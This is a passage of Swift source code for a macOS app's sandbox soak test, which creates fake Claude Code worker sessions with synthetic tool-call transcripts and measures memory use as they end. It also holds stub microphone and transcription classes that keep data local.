            .map { String(format: "%@ %+.1f", name($0.0), $0.1) }.joined(separator: ", ")
    }
}

// MARK: Soak: a real-shaped worker

extension Driver {
    /// A worker shaped like a real one (app-memory-steps-up), from its start to the role sweep ending it: a task on the
    /// fake lead's board, a transcript of `worker-mb` MB of tool calls and their output as Claude Code writes them,
    /// messages in its steer inbox, its chat and then its terminal shown with a build's and a test run's output printed
    /// in it. Then its task merges and the role sweep (the app's `RoleSweep`, on a roster of this worker: the sandbox's
    /// fake lead can't bind roles in the host's vault) ends it, and the lead controller removes it as it removes a
    /// finished task's ended workers (`forgetFinished`). Its footprint once it's gone goes in the log.
    func soakWorker(_ cycle: Int, _ done: @escaping (Bool, String) -> Void) {
        guard let run = soakRun else { return done(true, "") }
        let lead = "sandbox-lead", slug = "soak-worker-\(cycle)", title = "Soak worker \(cycle)", label = "Worker: Soak worker \(cycle)"
        let root = ((home as NSString).appendingPathComponent("projects/\(lead)") as NSString).standardizingPath
        let contract = LeadContract(goal: "The board's rows read the board once a refresh, and the Team tab keeps its rows.",
                                    acceptance: ["TeamRows reads the board once", "Focused tests pass", "The lint filter passes"],
                                    boundaries: ["Sources/VibeSwitcher/MainWindow/Lead", "Tests"], context: "Cycle \(cycle) of the soak.")
        do {
            try BoardStore(root: root).update { board in
                board.tasks.append(LeadTask(slug: slug, title: title, contract: contract, status: .running))
            }
        } catch {
            return done(false, "couldn't write the lead's board: \(error)")
        }
        let transcript = Self.workerTranscript(cycle: cycle, bytes: Int(run.workerMB * 1_048_576))
        startFake(label: label, slug: "\(lead)/.vibeswitcher/worktrees/\(slug)", transcript: transcript, title: "worker-\(slug)") { [weak self] problem in
            guard let self else { return done(true, "") }
            if let problem { return done(false, problem) }
            guard let fake = self.fakeList.first(where: { $0.label == label }) else { return done(false, "the worker isn't listed") }
            try? BoardStore(root: root).update { board in
                guard let index = board.tasks.firstIndex(where: { $0.slug == slug }) else { return }
                board.tasks[index].worker = fake.id.uuidString
                board.tasks[index].worktree = fake.cwd
            }
            // Its steer inbox: the lead's messages, as a real worker gets them between its turns.
            for text in Self.workerMessages(cycle) { self.leads.tell(text, from: .lead("lead"), session: fake.id) }
            // Its chat (its whole transcript read), then its terminal with real output printed in it.
            self.chat(label) { _, _ in
                self.model.showsChat = false
                self.tellFake(fake, #"{"op": "print", "file": "\#(self.soakOutputFile().path)"}"#)
                self.waitFor({ [weak self] in (self?.window?.pane.terminalView(fake.id)?.getTerminal().getTopVisibleRow() ?? 0) >= 1_000 }) { printed in
                    self.model.showsChat = true
                    if !printed { run.note("cycle \(cycle): the worker's terminal didn't show its output") }
                    self.soakEndWorker(fake, slug: slug, root: root, run: run, done)
                }
            }
        }
    }

    /// The worker's task merges, the role sweep ends its session, and the lead controller removes it (the soak does
    /// what's left after 30 s, and says so); then its footprint and malloc's are noted.
    private func soakEndWorker(_ fake: Fake, slug: String, root: String, run: SoakRun, _ done: @escaping (Bool, String) -> Void) {
        let now = Date().timeIntervalSince1970
        try? BoardStore(root: root).update { board in
            guard let index = board.tasks.firstIndex(where: { $0.slug == slug }) else { return }
            board.tasks[index].status = .done
            board.tasks[index].since = now
            board.tasks[index].merged = LeadMergeRecord(commit: String(format: "%08x", slug.hashValue & 0xffff_ffff), tested: true, audited: false, at: now)
        }
        let entries = [LeadVault.RosterEntry(root: root, session: fake.id.uuidString, role: .worker, task: slug, holds: true,
                                             boundAt: now - 600, toolsAt: now - 590)]
        let hosted = host.sessions
        let sweep = run.sweep(host)
        sweep.queue.async {
            sweep.roster = { entries }
            sweep.look(hosted: hosted, idleSince: { _ in nil }, agent: { _ in (nil, nil) })
        }
        waitFor({ [weak self] in !(self?.host.sessions.contains { $0.id == fake.id } ?? false) }) { [weak self] removed in
            guard let self else { return done(true, "") }
            let measure = {
                var stats = malloc_statistics_t()
                malloc_zone_statistics(nil, &stats)
                let footprint = AppHealthWatcher.ownFootprint()?.now ?? 0, malloc = Double(stats.size_in_use) / 1_048_576
                run.workers.append((footprint, malloc))
                let tags = SoakMemory.byTag()
                let changed = run.workerTags.map { SoakMemory.change(from: $0, to: tags) } ?? "the first"
                run.workerTags = tags
                run.note(String(format: "worker %3d ended (%@): footprint %6.1f MB  malloc in use %6.1f MB  chats %@  terminal views %@  ",
                                run.workers.count, slug, footprint, malloc, IdleBench.Live.chats.map(String.init) ?? "n/a",
                                IdleBench.Live.views.map(String.init) ?? "n/a")
                         + SoakMemory.ledgers() + "  since the last worker: " + changed)
                done(true, "")
            }
            if removed { return measure() }
            run.note("\(slug): not removed by the role sweep and the lead controller in 30 s: removed by the soak")
            self.host.kill(fake.id)
            self.waitFor({ [weak self] in self?.host.sessions.first { $0.id == fake.id }?.isLive != true }) { [weak self] _ in
                self?.host.remove(fake.id)
                self?.waitFor({ [weak self] in !(self?.host.sessions.contains { $0.id == fake.id } ?? false) }) { _ in measure() }
            }
        }
    }

    /// Appends a FakeClaude op to the fake's control file.
    private func tellFake(_ fake: Fake, _ json: String) {
        guard let file = fake.control, let handle = FileHandle(forWritingAtPath: file) else { return }
        handle.seekToEndOfFile()
        handle.write(Data((json + "\n").utf8))
        try? handle.close()
    }

    /// A build's and a test run's output as a terminal shows them (colored, about 1.2 MB, 12,000 lines), written once.
    private func soakOutputFile() -> URL {
        let file = state.appendingPathComponent("soak-worker-output.txt")
        if FileManager.default.fileExists(atPath: file.path) { return file }
        var text = ""
        for index in 0..<4_000 {
            text += "\u{1b}[1m[\(index)/4000]\u{1b}[0m Compiling VibeSwitcher MainWindow/Lead/TeamRows\(index % 97).swift\r\n"
            text += "Test Case '-[VibeSwitcherTests.TeamRowsTests testRow\(index)]' \u{1b}[32mpassed\u{1b}[0m (0.\(String(format: "%03d", index % 1000)) seconds).\r\n"
            text += "    \u{1b}[2m/Users/sandbox/projects/sandbox-lead/Sources/VibeSwitcher/MainWindow/Lead/TeamRows.swift:\(index % 400): note: rows read once\u{1b}[0m\r\n"
        }
        try? VibePaths.writePrivate(Data(text.utf8), to: file)
        return file
    }

    /// The lead's messages to a worker: its brief's follow-ups, a review's points, a merge's word.
    static func workerMessages(_ cycle: Int) -> [String] {
        let points = (1...12).map { "\($0). TeamRows.swift:\(40 + $0 * 7): the row reads the board again on each pass; read it once and keep the rows by slug." }
        return [
            "Cycle \(cycle): the verifier found two things to fix before the merge:\n" + points.joined(separator: "\n"),
            "Rebase onto main first: main moved (3 commits, the board's reads). Then run the focused tests and the lint filter again.",
            "Merged as abc\(cycle)def. Thanks: report done when the tests pass, and leave the worktree as it is.",
        ]
    }

    /// A worker's transcript as Claude Code writes it, about `bytes` long: its brief, then rounds of tool calls (Bash,
    /// Read, Edit, Grep) with their results (a test run's output, a file's lines, a diff), each result in the message
    /// and again in its `toolUseResult`, as Claude Code keeps both.
    static func workerTranscript(cycle: Int, bytes: Int) -> String {
        let session = UUID().uuidString
        let start = Date().addingTimeInterval(-3_600)
        let stamps = ISO8601DateFormatter()
        var lines: [String] = []
        var size = 0
        var parent: String?
        func add(_ object: [String: Any]) {
            var object = object
            let id = UUID().uuidString
            object["uuid"] = id
            object["parentUuid"] = parent ?? NSNull()
            object["sessionId"] = session
            object["isSidechain"] = false
            object["cwd"] = "/Users/sandbox/projects/sandbox-lead/.vibeswitcher/worktrees/soak-worker-\(cycle)"
            object["timestamp"] = stamps.string(from: start.addingTimeInterval(Double(lines.count)))
            object["version"] = "2.1.312"
            parent = id
            guard let data = try? JSONSerialization.data(withJSONObject: object), let line = String(data: data, encoding: .utf8) else { return }
            lines.append(line)
            size += line.utf8.count + 1
        }
        let brief = "You are a worker for the project lead. Task: the board's rows read the board once a refresh.\n\n"
            + String(repeating: "Boundaries: Sources/VibeSwitcher/MainWindow/Lead, tests. Run the focused tests while editing.\n", count: 40)
        add(["type": "user", "message": ["role": "user", "content": brief]])
        var round = 0
        while size < bytes {
            round += 1
            let tool = ["Bash", "Read", "Edit", "Grep"][round % 4]
            let call = "toolu_\(cycle)_\(round)"
            let input: [String: Any]
            let output: String
            switch tool {
            case "Bash":
                input = ["command": "bash scripts/test.sh --filter TeamRowsTests", "description": "Run the focused tests"]
                output = (0..<160).map { "Test Case '-[VibeSwitcherTests.TeamRowsTests testRow\($0)]' passed (0.0\($0 % 10)2 seconds)." }.joined(separator: "\n")
            case "Read":
                input = ["file_path": "/Users/sandbox/projects/sandbox-lead/Sources/VibeSwitcher/MainWindow/Lead/TeamRows\(round % 9).swift"]
                output = (1...220).map { "\($0)\u{2192}        let rows = TeamRows.rows(board, seen: seen) // line \($0) of round \(round)" }.joined(separator: "\n")
            case "Edit":
                input = ["file_path": "/Users/sandbox/projects/sandbox-lead/Sources/VibeSwitcher/MainWindow/Lead/TeamRows.swift",
                         "old_string": String(repeating: "let rows = TeamRows.rows(board, seen: seen)\n", count: 12),
                         "new_string": String(repeating: "let rows = cached ?? TeamRows.rows(board, seen: seen)\n", count: 12)]
                output = "The file has been updated. Here's the result of running `cat -n` on a snippet:\n"
                    + (1...60).map { "\($0)\u{2192}    let rows = cached ?? TeamRows.rows(board, seen: seen)" }.joined(separator: "\n")
            default:
                input = ["pattern": "TeamRows.rows", "output_mode": "content", "-n": true]
                output = (1...120).map { "Sources/VibeSwitcher/MainWindow/Lead/File\($0 % 30).swift:\($0 * 3):        let rows = TeamRows.rows(board, seen: seen)" }.joined(separator: "\n")
            }
            add(["type": "assistant", "message": ["id": "msg_\(cycle)_\(round)", "type": "message", "role": "assistant", "model": "claude-opus-5-5",
                                                  "content": [["type": "text", "text": "Round \(round): checking with \(tool) that the rows are read once."],
                                                              ["type": "tool_use", "id": call, "name": tool, "input": input]],
                                                  "usage": ["input_tokens": 12, "output_tokens": 240, "cache_read_input_tokens": 80_000 + round]]])
            add(["type": "user", "message": ["role": "user", "content": [["type": "tool_result", "tool_use_id": call, "content": output]]],
                 "toolUseResult": ["stdout": output, "stderr": "", "interrupted": false, "isImage": false]])
        }
        add(["type": "assistant", "message": ["role": "assistant", "content": [["type": "text", "text": "Done: the rows read the board once, and the tests pass."]]]])
        return lines.joined(separator: "\n") + "\n"
    }
}

/// The sandbox's microphone: no device opened, a made-up recording handed over.
/// The sandbox's microphone permission: always allowed, never the Mac's (no dialog).
final class SandboxMicrophone: MicrophoneAuthorizer {
    var status: MicrophoneStatus { .allowed }
    func request(_ done: @escaping (Bool) -> Void) { done(true) }
}

final class SandboxRecorder: DictationRecorder {
    func permission(_ done: @escaping (Bool) -> Void) { done(true) }
    func start() throws {}
    func stop() -> DictationAudio? { DictationAudio(data: Data("sandbox-recording".utf8), mimeType: "audio/mp4", duration: 2) }
    func cancel() {}
}

/// The sandbox's OpenAI: nothing leaves the Mac, a made-up transcript comes back.
struct SandboxTranscriber: HTTPClient {
    func send(_ request: URLRequest) async throws -> (Data, URLResponse) {
        (Data(#"{"text":"run the tests on ComposerView.swift"}"#.utf8),
         HTTPURLResponse(url: request.url!, statusCode: 200, httpVersion: "HTTP/1.1", headerFields: nil)!)
    }
}

/// `wallet-page`'s web view's navigation: `done` once the page loaded (nil) or failed (why).
final class WalletPageLoad: NSObject, WKNavigationDelegate {
    var done: (String?) -> Void = { _ in }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) { done(nil) }
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) { done("\(error)") }
    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) { done("\(error)") }
}


/// The `menu-bar` sheet: the menu bar icon on a strip of the bar's material, its tooltip's words under it.
private struct MenuBarStrip: View {
    let sessions: [Session]
    @ObservedObject var watch: BoostWatch

    var body: some View {
        let boost = watch.state?.on == true ? watch.state : nil
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Spacer()
                Image(nsImage: StatusIcon.image(for: sessions, boost: boost))
                Image(systemName: "wifi").foregroundStyle(.primary).accessibilityHidden(true)
                Text("Sun 12:52").font(.system(size: 13)).foregroundStyle(.primary)
            }
            .padding(.horizontal, 10).frame(height: 24)
            .background(.bar)
            Text(watch.menuText ?? (watch.state?.text ?? "boost not decided")).font(.caption).foregroundStyle(.secondary)
        }
        .frame(width: 360).padding(12)
    }
}
